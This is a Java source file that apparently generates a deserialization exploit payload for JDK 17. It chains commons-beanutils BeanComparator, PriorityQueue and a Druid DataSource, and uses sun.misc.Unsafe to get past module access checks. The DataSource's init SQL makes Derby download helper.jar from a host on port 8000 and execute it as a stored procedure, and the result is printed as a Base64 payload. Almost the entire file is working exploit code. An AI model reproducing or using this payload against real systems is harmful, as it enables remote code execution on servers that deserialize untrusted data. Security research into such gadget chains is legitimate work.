package org.example;

import com.alibaba.druid.pool.DruidDataSource;
import org.apache.commons.beanutils.BeanComparator;
import sun.misc.Unsafe;

import javax.naming.CompositeName;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;


/**
 * @author by RacerZ
 * @date 2024/2/14.
 */
public class Test1 {
    public static void main(String[] args) throws Exception {
        System.out.println("=================================");
        String body = new Test1().getPayload();
        System.out.println(body);
    }

    public String getPayload() throws Exception {
        // bypass jdk17 module access restrict
        Object obj = getObject();
        ByteArrayOutputStream boos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(boos);
        oos.writeObject(obj);
        return Base64.getEncoder().encodeToString(boos.toByteArray());
    }

    public Object getObject() throws Exception {
        // mock method name until armed
        BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        // create queue with numbers and basic comparator
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        // bypass jdk
        Object obj = bypassModule();
        assert obj != null;
        ArrayList<Class> bypassList = new ArrayList<>();
        bypassList.add(Class.forName("org.apache.commons.beanutils.BeanComparator"));
        bypassList.add(Class.forName("java.util.PriorityQueue"));
        bypassModule(bypassList);

        setFieldValue(comparator, "property", "connection");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        return queue;
    }

    private static Unsafe reflectGetUnsafe() {
        try {
            Field field = Unsafe.class.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            return (Unsafe) field.get(null);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.setAccessible(true);
        if(field != null) {
            field.set(obj, value);
        }
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    private static Method getMethod(Class clazz, String methodName, Class[] params) {
        Method method = null;
        while (clazz!=null){
            try {
                method = clazz.getDeclaredMethod(methodName,params);
                break;
            }catch (NoSuchMethodException e){
                clazz = clazz.getSuperclass();
            }
        }
        return method;
    }

    public Object createObject() throws Exception {
//        Class ldapAttributeClazz = Class.forName("com.alibaba.druid.pool.DruidDataSource");
        DruidDataSource druidDataSource = new DruidDataSource();
        String value = "CALL SQLJ.INSTALL_JAR('http://127.0.0.1:8000/helper.jar', 'APP.Sample4', 0);CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','APP.Sample4');CREATE PROCEDURE SALES.TOTAL_REVENUES2() PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME 'App.exec';CALL SALES.TOTAL_REVENUES2();";

        StringTokenizer tokenizer = new StringTokenizer(value, ";");
        druidDataSource.setConnectionInitSqls(Collections.list(tokenizer));
        druidDataSource.setUrl("jdbc:derby:webdb;create=true");
        druidDataSource.setDriverClassName("org.apache.derby.jdbc.EmbeddedDriver");
        druidDataSource.setInitialSize(1);

        // prevent NotSerializableException
        setFieldValue(druidDataSource, "logWriter", null);
        setFieldValue(druidDataSource, "statLogger", null);
        setFieldValue(druidDataSource, "transactionHistogram", null);
        setFieldValue(druidDataSource, "initedLatch", null);

        return druidDataSource;
    }

    public void bypassModule(ArrayList<Class> classes) throws Exception {
        try {
            Unsafe unsafe = reflectGetUnsafe();
            Class currentClass = this.getClass();
            Method getModuleMethod = getMethod(Class.class, "getModule", new Class[0]);

            for (Class targetClass : classes) {
                if (getModuleMethod != null) {
                    Object targetModule = getModuleMethod.invoke(targetClass, new Object[]{});
                    unsafe.getAndSetObject(currentClass, unsafe.objectFieldOffset(Class.class.getDeclaredField("module")), targetModule);
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Object bypassModule(){
        Object payload = null;
        try {
            Unsafe unsafe = reflectGetUnsafe();
            Class InstrumentationImplClass = Class.forName("com.alibaba.druid.pool.DruidDataSource");
            Class currentClass = this.getClass();
            try {
                Method getModuleMethod = getMethod(Class.class, "getModule", new Class[0]);
                if (getModuleMethod != null) {
                    Object targetModule = getModuleMethod.invoke(InstrumentationImplClass, new Object[]{});
                    unsafe.getAndSetObject(currentClass, unsafe.objectFieldOffset(Class.class.getDeclaredField("module")), targetModule);

                    // generate Object
                    payload = createObject();
                }
            }catch (Exception e) {
                e.printStackTrace();
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return payload;
    }
}
